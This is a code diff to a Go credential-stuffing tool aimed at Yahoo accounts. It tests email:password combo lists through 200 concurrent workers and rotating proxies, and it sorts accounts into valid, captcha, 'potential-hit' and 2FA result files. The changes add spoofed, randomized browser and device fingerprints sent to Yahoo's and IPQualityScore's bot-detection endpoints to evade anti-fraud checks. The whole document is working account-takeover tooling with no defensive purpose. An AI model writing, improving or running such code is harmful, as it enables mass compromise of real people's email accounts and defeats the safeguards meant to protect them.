@@ -1,12 +1,13 @@
 package main
 
 import (
-	"crypto/rand"
+	cryptorand "crypto/rand"
 	"crypto/sha256"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
+	mrand "math/rand/v2"
 	"net/url"
 	"os"
 	"path/filepath"
@@ -21,43 +22,64 @@ import (
 	tls_client "github.com/bogdanfinn/tls-client"
 	"github.com/bogdanfinn/tls-client/profiles"
 	"github.com/joho/godotenv"
+	"golang.org/x/sys/windows"
 )
 
 var (
 	baseDir      = mustAbs(".")
 	combosFile   = filepath.Join(baseDir, "combos.txt")
 	resultDir    = filepath.Join(baseDir, "result")
-	validFile    = filepath.Join(resultDir, "valid.txt")
-	invalidFile  = filepath.Join(resultDir, "invalid.txt")
-	workers      = 200
+	validFile   = filepath.Join(resultDir, "valid.txt")
+	invalidFile = filepath.Join(resultDir, "invalid.txt")
+	captchaFile      = filepath.Join(resultDir, "captcha.txt")
+	potentialHitFile = filepath.Join(resultDir, "potential-hit.txt")
+	twoFAFile        = filepath.Join(resultDir, "2fa.txt")
+	workers          = 200
 	proxyCfg     Proxy
 	writeMu      sync.Mutex
 	ipqsLearnPath = "/api/*/Z6zn1EFDPjFfpfhcrY9lhKf34Sr5jq4H79qMV5ZrKQoNE8mofcWGXBWlPjLFj6NGbNAwRTuX5fyCKvS9oEJMmQnGRRFMePUlbchjKe3lqnUGnwJ5yab9XcrIzAQ3cGyDOAtKl0Womp7vVBOWPDtNL8VFMVsLJK0VnWDAXlaFdokaHZoBwtdzyVtIsP2IjIAo2pu6Va56MAarg9yez1Rxvy7jzEFI3dRR21PUo1bT8703DzbpRappGVNpe0MGfaha/learn/fetch"
-	ipqsHosts     = []string{
+	ipqsHosts = []string{
 		"dtproxy5.yahoo.nc.clients.ipqs.com",
 		"dtproxy6.yahoo.nc.clients.ipqs.com",
 		"fn.nc.ipqualityscore.com",
 	}
-	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
 	runStarted = time.Time{}
 )
 
 const (
-	cReset         = "\x1b[0m"
-	cBold          = "\x1b[1m"
-	cBrightRed     = "\x1b[91m"
-	cBrightGreen   = "\x1b[92m"
-	cBrightYellow  = "\x1b[93m"
+	cReset        = "\x1b[0m"
+	cBold         = "\x1b[1m"
+	cBrightRed    = "\x1b[91m"
+	cBrightGreen  = "\x1b[92m"
+	cBrightYellow = "\x1b[93m"
 	cBrightCyan    = "\x1b[96m"
+	cBrightBlue    = "\x1b[94m"
+	cBrightMagenta = "\x1b[95m"
 	cBrightWhite   = "\x1b[97m"
+	cGray          = "\x1b[90m"
 )
 
 func paint(color, msg string) string {
 	return color + cBold + msg + cReset
 }
 
+func paintGray(msg string) string {
+	return cGray + msg + cReset
+}
+
 func logLine(color, msg string) {
 	fmt.Println(paint(color, msg))
+}
+
+func enableColors() {
+	for _, f := range []*os.File{os.Stdout, os.Stderr} {
+		h := windows.Handle(f.Fd())
+		var mode uint32
+		if err := windows.GetConsoleMode(h, &mode); err != nil {
+			continue
+		}
+		_ = windows.SetConsoleMode(h, mode|windows.ENABLE_VIRTUAL_TERMINAL_PROCESSING)
+	}
 }
 
 type Combo struct {
@@ -92,6 +114,11 @@ type ipqsResult struct {
 	Host string
 }
 
+type loginResult struct {
+	IRI      string
+	Response string
+}
+
 func mustAbs(p string) string {
 	abs, err := filepath.Abs(p)
 	if err != nil {
@@ -124,26 +151,26 @@ func main() {
 	resetResultDir()
 	runStarted = time.Now()
 
-	logLine(cBrightCyan, fmt.Sprintf("Yahoo HTTP auto login | %s", stamp(0)))
-	logLine(cBrightWhite, fmt.Sprintf("  Combos=%d | %s", len(combos), stamp(0)))
-	logLine(cBrightWhite, fmt.Sprintf("  Workers=%d | %s", workers, stamp(0)))
-	logLine(cBrightWhite, fmt.Sprintf("  Proxy=%s:%d | %s", proxyCfg.Host, proxyCfg.Port, stamp(0)))
-	logLine(cBrightYellow, fmt.Sprintf("  Valid=%s | %s", validFile, stamp(0)))
-	logLine(cBrightYellow, fmt.Sprintf("  Invalid=%s | %s", invalidFile, stamp(0)))
+	logLine(cBrightWhite, fmt.Sprintf("  Combos=%d", len(combos)))
+	logLine(cBrightWhite, fmt.Sprintf("  Workers=%d", workers))
+	logLine(cBrightWhite, fmt.Sprintf("  Proxy=%s:%d", proxyCfg.Host, proxyCfg.Port))
 	fmt.Println()
 
-	failed := runWithWorkers(combos, workers)
-	valid := len(combos) - failed
+	stats := runWithWorkers(combos, workers)
 	fmt.Println()
-	doneMsg := fmt.Sprintf("  Done=%d valid / %d invalid | %s", valid, failed, stamp(len(combos)))
-	if failed == 0 {
+	doneMsg := fmt.Sprintf(
+		"  Done=%d valid / %d invalid / %d captcha / %d potential-hit / %d 2fa | %s",
+		stats.Valid, stats.Invalid, stats.Captcha, stats.PotentialHit, stats.TwoFA, stamp(len(combos)),
+	)
+	switch {
+	case stats.Invalid == 0 && stats.Captcha == 0 && stats.PotentialHit == 0 && stats.TwoFA == 0:
 		logLine(cBrightGreen, doneMsg)
-	} else if valid == 0 {
+	case stats.Valid == 0 && stats.Captcha == 0 && stats.PotentialHit == 0 && stats.TwoFA == 0:
 		logLine(cBrightRed, doneMsg)
-	} else {
+	default:
 		logLine(cBrightYellow, doneMsg)
 	}
-	if failed > 0 {
+	if stats.Invalid > 0 || stats.Captcha > 0 {
 		os.Exit(1)
 	}
 }
@@ -216,7 +243,7 @@ var sessionRe = regexp.MustCompile(`_session-[A-Za-z0-9]+`)
 func rotateProxyUsername() string {
 	base := sessionRe.ReplaceAllString(proxyCfg.Username, "")
 	b := make([]byte, 8)
-	_, _ = rand.Read(b)
+	_, _ = cryptorand.Read(b)
 	return base + "_session-" + hex.EncodeToString(b)
 }
 
@@ -230,6 +257,190 @@ func createSessionClient() (tls_client.HttpClient, error) {
 		tls_client.WithRandomTLSExtensionOrder(),
 	}
 	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
+}
+
+type deviceFP struct {
+	UA             string
+	Language       string
+	AcceptLanguage string
+	Platform       string
+	ColorDepth     int
+	PixelRatio     float64
+	DeviceMemory   int
+	Cores          int
+	TimezoneOffset int
+	Timezone       string
+	ScreenW        int
+	ScreenH        int
+	AvailW         int
+	AvailH         int
+	PluginsCount   int
+	PluginsHash    string
+	FontsCount     int
+	FontsHash      string
+	Canvas         string
+	WebGL          string
+	Audio          string
+}
+
+type tzProfile struct {
+	Name   string
+	Offset int // JS getTimezoneOffset minutes
+}
+
+type screenProfile struct {
+	W, H, AvailW, AvailH int
+}
+
+func pickOne[T any](items []T) T {
+	return items[mrand.IntN(len(items))]
+}
+
+func randomHex(n int) string {
+	b := make([]byte, (n+1)/2)
+	_, _ = cryptorand.Read(b)
+	return hex.EncodeToString(b)[:n]
+}
+
+func newDeviceFP() deviceFP {
+	screens := []screenProfile{
+		{1920, 1080, 1920, 1040},
+		{1920, 1200, 1920, 1160},
+		{2560, 1440, 2560, 1400},
+		{1366, 768, 1366, 728},
+		{1536, 864, 1536, 824},
+		{1440, 900, 1440, 860},
+		{1680, 1050, 1680, 1010},
+		{1280, 720, 1280, 680},
+		{2560, 1080, 2560, 1040},
+		{3840, 2160, 3840, 2120},
+	}
+	timezones := []tzProfile{
+		{"Europe/Rome", -60},
+		{"Europe/Paris", -60},
+		{"Europe/Berlin", -60},
+		{"Europe/Madrid", -60},
+		{"Europe/London", 0},
+		{"America/New_York", 300},
+		{"America/Chicago", 360},
+		{"America/Los_Angeles", 480},
+		{"Asia/Tokyo", -540},
+	}
+	langs := []struct{ Lang, Accept string }{
+		{"en-US", "en-US,en;q=0.9"},
+		{"en-GB", "en-GB,en;q=0.9"},
+		{"it-IT", "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7"},
+		{"fr-FR", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"},
+		{"de-DE", "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"},
+		{"es-ES", "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7"},
+	}
+	webgls := []string{
+		"Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0)",
+		"Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
+		"Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce GTX 1050 Ti Direct3D11 vs_5_0 ps_5_0)",
+		"Google Inc. (Intel)~ANGLE (Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)",
+		"Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
+		"Google Inc. (AMD)~ANGLE (AMD Radeon RX 580 Series Direct3D11 vs_5_0 ps_5_0)",
+		"Google Inc. (AMD)~ANGLE (AMD Radeon(TM) Graphics Direct3D11 vs_5_0 ps_5_0)",
+	}
+	memories := []int{4, 8, 8, 16}
+	cores := []int{4, 6, 8, 8, 12, 16}
+	ratios := []float64{1, 1, 1.25, 1.5, 2}
+
+	// Keep UA near tls-client Chrome_133 profile for consistency.
+	chromeMajor := 131 + mrand.IntN(4) // 131-134
+	chromeFull := fmt.Sprintf("%d.0.0.0", chromeMajor)
+	ua := fmt.Sprintf(
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36",
+		chromeFull,
+	)
+
+	screen := pickOne(screens)
+	tz := pickOne(timezones)
+	lang := pickOne(langs)
+
+	audio := fmt.Sprintf("%.14f", 100+mrand.Float64()*40)
+	canvas := "canvas winding:yes~canvas-" + randomHex(16)
+
+	return deviceFP{
+		UA:             ua,
+		Language:       lang.Lang,
+		AcceptLanguage: lang.Accept,
+		Platform:       "Win32",
+		ColorDepth:     24,
+		PixelRatio:     pickOne(ratios),
+		DeviceMemory:   pickOne(memories),
+		Cores:          pickOne(cores),
+		TimezoneOffset: tz.Offset,
+		Timezone:       tz.Name,
+		ScreenW:        screen.W,
+		ScreenH:        screen.H,
+		AvailW:         screen.AvailW,
+		AvailH:         screen.AvailH,
+		PluginsCount:   5,
+		PluginsHash:    randomHex(16),
+		FontsCount:     40 + mrand.IntN(40),
+		FontsHash:      randomHex(16),
+		Canvas:         canvas,
+		WebGL:          pickOne(webgls),
+		Audio:          audio,
+	}
+}
+
+func (fp deviceFP) browserFpJSON() string {
+	now := time.Now().UnixMilli()
+	payload := map[string]any{
+		"language":               fp.Language,
+		"colorDepth":             fp.ColorDepth,
+		"deviceMemory":           fp.DeviceMemory,
+		"pixelRatio":             fp.PixelRatio,
+		"hardwareConcurrency":    fp.Cores,
+		"timezoneOffset":         fp.TimezoneOffset,
+		"timezone":               fp.Timezone,
+		"sessionStorage":         1,
+		"localStorage":           1,
+		"indexedDb":              1,
+		"openDatabase":           1,
+		"cpuClass":               "unknown",
+		"platform":               fp.Platform,
+		"doNotTrack":             "unknown",
+		"plugins":                map[string]any{"count": fp.PluginsCount, "hash": fp.PluginsHash},
+		"canvas":                 fp.Canvas,
+		"webgl":                  1,
+		"webglVendorAndRenderer": fp.WebGL,
+		"adBlock":                0,
+		"hasLiedLanguages":       0,
+		"hasLiedResolution":      0,
+		"hasLiedOs":              0,
+		"hasLiedBrowser":         0,
+		"touchSupport":           map[string]any{"points": 0, "event": 0, "start": 0},
+		"fonts":                  map[string]any{"count": fp.FontsCount, "hash": fp.FontsHash},
+		"audio":                  fp.Audio,
+		"resolution":             map[string]string{"w": strconv.Itoa(fp.ScreenW), "h": strconv.Itoa(fp.ScreenH)},
+		"availableResolution":    map[string]string{"w": strconv.Itoa(fp.AvailW), "h": strconv.Itoa(fp.AvailH)},
+		"ts":                     map[string]int64{"serve": now, "render": now + int64(50+mrand.IntN(120))},
+	}
+	b, _ := json.Marshal(payload)
+	return string(b)
+}
+
+func (fp deviceFP) screenToken() string {
+	return fmt.Sprintf("%dx%d", fp.ScreenW, fp.ScreenH)
+}
+
+func (fp deviceFP) availToken() string {
+	return fmt.Sprintf("%dx%d", fp.AvailW, fp.AvailH)
+}
+
+func (fp deviceFP) headers(extra map[string]string) map[string]string {
+	out := map[string]string{
+		"User-Agent":      fp.UA,
+		"Accept-Language": fp.AcceptLanguage,
+	}
+	for k, v := range extra {
+		out[k] = v
+	}
+	return out
 }
 
 func doRequest(client tls_client.HttpClient, method, rawURL string, body string, headers map[string]string, followRedirects bool) (string, int, string, error) {
@@ -248,7 +459,7 @@ func doRequest(client tls_client.HttpClient, method, rawURL string, body string,
 		req.Header.Set(k, v)
 	}
 	if req.Header.Get("User-Agent") == "" {
-		req.Header.Set("User-Agent", userAgent)
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
 	}
 
 	resp, err := client.Do(req)
@@ -307,43 +518,6 @@ func extractPassContext(html, fallbackEmail string) passCtx {
 	return pc
 }
 
-func browserFpData() string {
-	now := time.Now().UnixMilli()
-	payload := map[string]any{
-		"language":             "en-US",
-		"colorDepth":           24,
-		"deviceMemory":         8,
-		"pixelRatio":           1,
-		"hardwareConcurrency":  8,
-		"timezoneOffset":       -60,
-		"timezone":             "Europe/Rome",
-		"sessionStorage":       1,
-		"localStorage":         1,
-		"indexedDb":            1,
-		"openDatabase":         1,
-		"cpuClass":             "unknown",
-		"platform":             "Win32",
-		"doNotTrack":           "unknown",
-		"plugins":              map[string]any{"count": 5, "hash": "2c21d957e91c20ea"},
-		"canvas":               "canvas winding:yes~canvas",
-		"webgl":                1,
-		"webglVendorAndRenderer": "Google Inc. (NVIDIA)~ANGLE",
-		"adBlock":              0,
-		"hasLiedLanguages":     0,
-		"hasLiedResolution":    0,
-		"hasLiedOs":            0,
-		"hasLiedBrowser":       0,
-		"touchSupport":         map[string]any{"points": 0, "event": 0, "start": 0},
-		"fonts":                map[string]any{"count": 50, "hash": "edeefd360161b4bf"},
-		"audio":                "124.04347527516074",
-		"resolution":           map[string]string{"w": "1920", "h": "1080"},
-		"availableResolution":  map[string]string{"w": "1040", "h": "1920"},
-		"ts":                   map[string]int64{"serve": now, "render": now + 80},
-	}
-	b, _ := json.Marshal(payload)
-	return string(b)
-}
-
 func xhrHeaders(referer string) map[string]string {
 	if referer == "" {
 		referer = "https://login.yahoo.com/"
@@ -361,38 +535,43 @@ func xhrHeaders(referer string) map[string]string {
 }
 
 func mapYahooError(raw any) string {
+	var parts []string
 	message := fmt.Sprint(raw)
 	if m, ok := raw.(map[string]any); ok {
-		if v, ok := m["message"]; ok {
-			message = fmt.Sprint(v)
-		} else if v, ok := m["code"]; ok {
-			message = fmt.Sprint(v)
-		} else if v, ok := m["error"]; ok {
-			message = fmt.Sprint(v)
+		for _, key := range []string{"code", "message", "error", "name"} {
+			if v, ok := m[key]; ok && v != nil {
+				parts = append(parts, fmt.Sprint(v))
+			}
+		}
+		if len(parts) > 0 {
+			message = strings.Join(parts, " ")
 		}
 	}
+	blob := strings.ToUpper(message + " " + fmt.Sprint(raw))
 
 	re := regexp.MustCompile(`(?i)ERROR_(\d+)`)
-	if m := re.FindStringSubmatch(message); len(m) > 1 {
+	if m := re.FindStringSubmatch(blob); len(m) > 1 {
 		if n, err := strconv.Atoi(m[1]); err == nil {
 			if n >= 100 && n < 200 {
-				return "not existed username"
+				return "invalid username"
 			}
 			if n >= 200 && n < 300 {
 				return "INVALID_PHONE_NUMBER"
 			}
 		}
 	}
-	upper := strings.ToUpper(message)
+
 	switch {
-	case strings.Contains(upper, "INVALID_USERNAME"):
-		return "not existed username"
-	case strings.Contains(upper, "INVALID_PHONE_NUMBER"):
+	case strings.Contains(blob, "INVALID_USERNAME"),
+		strings.Contains(blob, "INVALID_IDENTIFIER"),
+		strings.Contains(blob, "ERROR_NOTFOUND"),
+		strings.Contains(blob, "USERNAME TYPED WRONG"),
+		strings.Contains(blob, "TYPED WRONG"):
+		return "invalid username"
+	case strings.Contains(blob, "INVALID_PHONE_NUMBER"):
 		return "INVALID_PHONE_NUMBER"
-	case strings.Contains(upper, "INVALID_IDENTIFIER"), strings.Contains(upper, "ERROR_NOTFOUND"):
-		return "not existed username"
 	}
-	if message == "" {
+	if message == "" || message == "<nil>" {
 		return "UNKNOWN_ERROR"
 	}
 	return message
@@ -450,14 +629,14 @@ func buildIpqsBody(vars map[string]any) string {
 	return strings.Join(parts, "&")
 }
 
-func fetchIpqsUdid(client tls_client.HttpClient) (string, error) {
+func fetchIpqsUdid(client tls_client.HttpClient, fp deviceFP) (string, error) {
 	raw, _, _, err := doRequest(client, http.MethodGet,
 		"https://dtproxy5.yahoo.nc.clients.ipqs.com/udid/udid.json", "",
-		map[string]string{
+		fp.headers(map[string]string{
 			"Accept":  "*/*",
 			"Origin":  "https://login.yahoo.com",
 			"Referer": "https://login.yahoo.com/",
-		}, true)
+		}), true)
 	if err != nil {
 		return "", err
 	}
@@ -468,29 +647,38 @@ func fetchIpqsUdid(client tls_client.HttpClient) (string, error) {
 	return udid, nil
 }
 
-func fetchIpqsRequestID(client tls_client.HttpClient, ipqsSessionID, referer string) (*ipqsResult, error) {
+func fetchIpqsRequestID(client tls_client.HttpClient, ipqsSessionID, referer string, fp deviceFP) (*ipqsResult, error) {
 	started := time.Now()
-	udid, err := fetchIpqsUdid(client)
+	udid, err := fetchIpqsUdid(client, fp)
 	if err != nil {
 		return nil, err
 	}
 
 	dtoo := fingerprintHash([]string{
-		userAgent, "Win32", "24", "1", "1920x1080", "1920x1040", "en-US", "-60", udid, ipqsSessionID,
+		fp.UA,
+		fp.Platform,
+		strconv.Itoa(fp.ColorDepth),
+		strconv.FormatFloat(fp.PixelRatio, 'f', -1, 64),
+		fp.screenToken(),
+		fp.availToken(),
+		fp.Language,
+		strconv.Itoa(fp.TimezoneOffset),
+		udid,
+		ipqsSessionID,
 	})
 
 	vars := map[string]any{
 		"ipqsd": udid,
 		"dta":   []any{map[string]string{"key": "sessionId", "value": ipqsSessionID}},
-		"dtb":   userAgent,
-		"dtc":   "Win32",
-		"dtd":   24,
-		"dte":   1,
+		"dtb":   fp.UA,
+		"dtc":   fp.Platform,
+		"dtd":   fp.ColorDepth,
+		"dte":   fp.PixelRatio,
 		"dtf":   "false",
-		"dtg":   "1920x1080",
-		"dth":   "1920x1040",
-		"dti":   "en-US",
-		"dtj":   -60,
+		"dtg":   fp.screenToken(),
+		"dth":   fp.availToken(),
+		"dti":   fp.Language,
+		"dtj":   fp.TimezoneOffset,
 		"dtk":   1,
 		"dtl":   1,
 		"dtnn":  0,
@@ -498,7 +686,7 @@ func fetchIpqsRequestID(client tls_client.HttpClient, ipqsSessionID, referer str
 		"dtn":   0,
 		"dto":   0,
 		"dtp":   "unknown",
-		"dtq":   "Win32",
+		"dtq":   fp.Platform,
 		"dtr":   "false",
 		"dtt":   "false",
 		"dtu":   "false",
@@ -531,13 +719,13 @@ func fetchIpqsRequestID(client tls_client.HttpClient, ipqsSessionID, referer str
 	var lastErr error
 	for _, host := range ipqsHosts {
 		rawURL := "https://" + host + ipqsLearnPath
-		raw, status, _, err := doRequest(client, http.MethodPost, rawURL, body, map[string]string{
+		raw, status, _, err := doRequest(client, http.MethodPost, rawURL, body, fp.headers(map[string]string{
 			"Content-Type":     "application/x-www-form-urlencoded",
 			"Accept":           "*/*",
 			"Origin":           "https://login.yahoo.com",
 			"Referer":          referer,
 			"X-Requested-With": "XMLHttpRequest",
-		}, false)
+		}), false)
 		if err != nil {
 			lastErr = err
 			continue
@@ -584,17 +772,85 @@ func parseJSONMap(raw string) (map[string]any, error) {
 	return m, nil
 }
 
-func yahooHTTPLogin(client tls_client.HttpClient, login Combo) (string, error) {
-	pageHTML, _, _, err := doRequest(client, http.MethodGet, "https://login.yahoo.com/", "", map[string]string{
-		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"Accept-Language": "en-US,en;q=0.9",
-	}, true)
+func extractEid(raw string) string {
+	m := regexp.MustCompile(`(?i)[?&]eid=(\d+)`).FindStringSubmatch(raw)
+	if len(m) > 1 {
+		return m[1]
+	}
+	return ""
+}
+
+func isPotentialHitRedirect(redirect string) bool {
+	// Password accepted, but Yahoo asks to choose a next challenge (no eid).
+	return regexp.MustCompile(`(?i)challenge-selector`).MatchString(redirect) &&
+		!regexp.MustCompile(`(?i)[?&]eid=`).MatchString(redirect)
+}
+
+func is2FARedirect(redirect string) bool {
+	if regexp.MustCompile(`(?i)yak-code|challenge/otp|two-factor|(?:^|/)2fa(?:/|$)|tsv-`).MatchString(redirect) {
+		return true
+	}
+	// challenge-selector with eid (e.g. eid=4200) is a forced 2FA/security challenge
+	return regexp.MustCompile(`(?i)challenge-selector`).MatchString(redirect) &&
+		regexp.MustCompile(`(?i)[?&]eid=`).MatchString(redirect)
+}
+
+func mapPasswordRedirect(redirect string) error {
+	if redirect == "" {
+		return nil
+	}
+	eid := extractEid(redirect)
+	fail := regexp.MustCompile(`(?i)challenge/fail`).MatchString(redirect)
+	badPass := regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) &&
+		regexp.MustCompile(`(?i)pcn=password`).MatchString(redirect)
+
+	if fail {
+		switch eid {
+		case "3692":
+			return fmt.Errorf("captcha")
+		case "3695":
+			return fmt.Errorf("device check fail (eid=3695)")
+		default:
+			if eid != "" {
+				return fmt.Errorf("device check fail (eid=%s)", eid)
+			}
+			return fmt.Errorf("device check fail (eid)")
+		}
+	}
+	if badPass {
+		return fmt.Errorf("invalid password")
+	}
+	if regexp.MustCompile(`(?i)challenge/password`).MatchString(redirect) &&
+		regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) {
+		return fmt.Errorf("password challenge failed")
+	}
+	return nil
+}
+
+func compactResponse(raw string) string {
+	raw = strings.TrimSpace(raw)
+	raw = strings.ReplaceAll(raw, "\r", " ")
+	raw = strings.ReplaceAll(raw, "\n", " ")
+	raw = strings.Join(strings.Fields(raw), " ")
+	if len(raw) > 400 {
+		return raw[:400] + "..."
+	}
+	return raw
+}
+
+func yahooHTTPLogin(client tls_client.HttpClient, login Combo, fp deviceFP) (loginResult, error) {
+	var out loginResult
+	fpJSON := fp.browserFpJSON()
+
+	pageHTML, _, _, err := doRequest(client, http.MethodGet, "https://login.yahoo.com/", "", fp.headers(map[string]string{
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+	}), true)
 	if err != nil {
-		return "", err
+		return out, err
 	}
 	ctx, err := extractContext(pageHTML)
 	if err != nil {
-		return "", err
+		return out, err
 	}
 
 	q := url.Values{}
@@ -606,7 +862,7 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo) (string, error) {
 	validateURL := "https://login.yahoo.com/validate?" + q.Encode()
 
 	usernameBody := url.Values{}
-	usernameBody.Set("browser-fp-data", browserFpData())
+	usernameBody.Set("browser-fp-data", fpJSON)
 	usernameBody.Set("crumb", ctx.Crumb)
 	usernameBody.Set("acrumb", ctx.Acrumb)
 	usernameBody.Set("sessionIndex", ctx.SessionIndex)
@@ -617,56 +873,63 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo) (string, error) {
 	usernameBody.Set("signin", "Next")
 	usernameBody.Set("persistent", "y")
 
-	userRaw, _, _, err := doRequest(client, http.MethodPost, validateURL, usernameBody.Encode(), xhrHeaders("https://login.yahoo.com/"), false)
+	userRaw, _, _, err := doRequest(client, http.MethodPost, validateURL, usernameBody.Encode(), fp.headers(xhrHeaders("https://login.yahoo.com/")), false)
 	if err != nil {
-		return "", err
+		return out, err
 	}
+	out.Response = compactResponse(userRaw)
 	userJSON, err := parseJSONMap(userRaw)
 	if err != nil {
-		return "", fmt.Errorf("username step did not return JSON")
+		return out, fmt.Errorf("username step did not return JSON")
 	}
 	if e, ok := userJSON["error"]; ok && e != nil {
-		return "", fmt.Errorf("%s", mapYahooError(e))
+		return out, fmt.Errorf("%s", mapYahooError(e))
 	}
 
 	passURL := toAbsoluteURL(fmt.Sprint(firstNonEmpty(userJSON["redirect"], userJSON["location"])))
 	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) && regexp.MustCompile(`(?i)pcn=username`).MatchString(passURL) {
-		return "", fmt.Errorf("not existed username")
+		return out, fmt.Errorf("invalid username")
 	}
 	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) {
-		return "", fmt.Errorf("username challenge fail")
+		return out, fmt.Errorf("username challenge fail")
+	}
+	if is2FARedirect(passURL) {
+		return out, fmt.Errorf("2fa")
+	}
+	if isPotentialHitRedirect(passURL) {
+		return out, fmt.Errorf("potential-hit")
 	}
 	if passURL == "" || !regexp.MustCompile(`(?i)password`).MatchString(passURL) {
-		return "", fmt.Errorf("unexpected next step: %s", firstNonEmpty(passURL, userRaw))
+		return out, fmt.Errorf("unexpected next step: %s", firstNonEmpty(passURL, userRaw))
 	}
 
-	passPageHTML, _, _, err := doRequest(client, http.MethodGet, passURL, "", map[string]string{
+	passPageHTML, _, _, err := doRequest(client, http.MethodGet, passURL, "", fp.headers(map[string]string{
 		"Accept":  "text/html,application/xhtml+xml",
 		"Referer": "https://login.yahoo.com/",
-	}, true)
+	}), true)
 	if err != nil {
-		return "", err
+		return out, err
 	}
 	passCtx := extractPassContext(passPageHTML, login.Email)
 	if passCtx.SessionIndex == "" || passCtx.Acrumb == "" || passCtx.Crumb == "" {
-		return "", fmt.Errorf("could not parse Yahoo login page tokens")
+		return out, fmt.Errorf("could not parse Yahoo login page tokens")
 	}
 	if passCtx.IpqsSessionID == "" {
-		return "", fmt.Errorf("password page missing ipqsSessionId")
+		return out, fmt.Errorf("password page missing ipqsSessionId")
 	}
 
-	ipqs, err := fetchIpqsRequestID(client, passCtx.IpqsSessionID, passURL)
+	ipqs, err := fetchIpqsRequestID(client, passCtx.IpqsSessionID, passURL, fp)
 	if err != nil {
-		return "", err
+		return out, err
 	}
 
 	passValidateURL, err := appendValidate(passURL)
 	if err != nil {
-		return "", err
+		return out, err
 	}
 
 	passBody := url.Values{}
-	passBody.Set("browser-fp-data", browserFpData())
+	passBody.Set("browser-fp-data", fpJSON)
 	passBody.Set("crumb", passCtx.Crumb)
 	passBody.Set("acrumb", passCtx.Acrumb)
 	passBody.Set("sessionIndex", passCtx.SessionIndex)
@@ -683,36 +946,47 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo) (string, error) {
 	passBody.Set("irc", "true")
 	passBody.Set("iri", ipqs.IRI)
 
-	passRaw, _, _, err := doRequest(client, http.MethodPost, passValidateURL, passBody.Encode(), xhrHeaders(passURL), false)
+	passRaw, _, _, err := doRequest(client, http.MethodPost, passValidateURL, passBody.Encode(), fp.headers(xhrHeaders(passURL)), false)
 	if err != nil {
-		return "", err
+		return out, err
 	}
+	out.Response = compactResponse(passRaw)
 	passJSON, err := parseJSONMap(passRaw)
 	if err != nil {
-		return "", fmt.Errorf("password step did not return JSON")
+		return out, fmt.Errorf("password step did not return JSON")
 	}
 	if e, ok := passJSON["error"]; ok && e != nil {
-		return "", fmt.Errorf("%s", mapYahooError(e))
+		return out, fmt.Errorf("%s", mapYahooError(e))
 	}
 
 	redirect := toAbsoluteURL(fmt.Sprint(firstNonEmpty(passJSON["redirect"], passJSON["location"])))
-	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(redirect) {
-		return "", fmt.Errorf("device check fail (eid)")
+	if err := mapPasswordRedirect(redirect); err != nil {
+		return out, err
 	}
-	if regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) && regexp.MustCompile(`(?i)pcn=password`).MatchString(redirect) {
-		return "", fmt.Errorf("invalid password")
+	if isPotentialHitRedirect(redirect) {
+		return out, fmt.Errorf("potential-hit")
 	}
-	if regexp.MustCompile(`(?i)challenge/password`).MatchString(redirect) && regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) {
-		return "", fmt.Errorf("password challenge failed")
+	if is2FARedirect(redirect) {
+		return out, fmt.Errorf("2fa")
 	}
 
 	if redirect != "" {
-		_, _, _, _ = doRequest(client, http.MethodGet, redirect, "", nil, true)
+		_, _, _, _ = doRequest(client, http.MethodGet, redirect, "", fp.headers(nil), true)
 	}
 
-	_, _, mailURL, err := doRequest(client, http.MethodGet, "https://mail.yahoo.com/", "", nil, true)
+	mailRaw, _, mailURL, err := doRequest(client, http.MethodGet, "https://mail.yahoo.com/", "", fp.headers(nil), true)
 	if err != nil {
-		return "", err
+		return out, err
+	}
+	_ = mailRaw
+
+	if is2FARedirect(mailURL) {
+		out.Response = compactResponse(mailURL)
+		return out, fmt.Errorf("2fa")
+	}
+	if isPotentialHitRedirect(mailURL) {
+		out.Response = compactResponse(mailURL)
+		return out, fmt.Errorf("potential-hit")
 	}
 
 	cookieNames := collectCookieNames(client)
@@ -727,9 +1001,19 @@ func yahooHTTPLogin(client tls_client.HttpClient, login Combo) (string, error) {
 		loggedIn = true
 	}
 	if !loggedIn {
-		return "", fmt.Errorf("no auth session")
+		// Login bounce to a challenge page should not be a generic invalid.
+		if is2FARedirect(mailURL) || regexp.MustCompile(`(?i)/account/challenge/`).MatchString(mailURL) {
+			out.Response = compactResponse(mailURL)
+			if isPotentialHitRedirect(mailURL) {
+				return out, fmt.Errorf("potential-hit")
+			}
+			return out, fmt.Errorf("2fa")
+		}
+		return out, fmt.Errorf("no auth session")
 	}
-	return ipqs.IRI, nil
+	// Keep password-step response for success logs (already set from passRaw).
+	out.IRI = ipqs.IRI
+	return out, nil
 }
 
 func firstNonEmpty(vals ...any) any {
@@ -767,7 +1051,7 @@ func collectCookieNames(client tls_client.HttpClient) []string {
 	return names
 }
 
